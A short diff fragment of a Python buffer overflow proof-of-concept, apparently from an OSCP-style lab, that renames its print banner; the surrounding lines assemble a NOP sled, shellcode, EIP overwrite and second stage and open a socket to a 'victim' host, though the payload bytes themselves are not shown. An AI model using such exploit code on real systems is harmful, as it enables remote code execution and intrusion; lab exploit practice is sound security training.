@@ -62,7 +62,7 @@ finbuff = "A" * (fullbuff - len(eip) - eipoffset - len(secstage))
 ## build the buffer string
 thebuff = inibuff + nopsled + shellcode + eip + secstage + finbuff
 
-print "[*] VulnApp3 Buffer Overflow POC OSCP.."
+print "[*] Vuln3 Buffer Overflow PoC.."
 print "[*] Total Length of buffer: " + str(len(thebuff))
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 s.connect((victim, port))
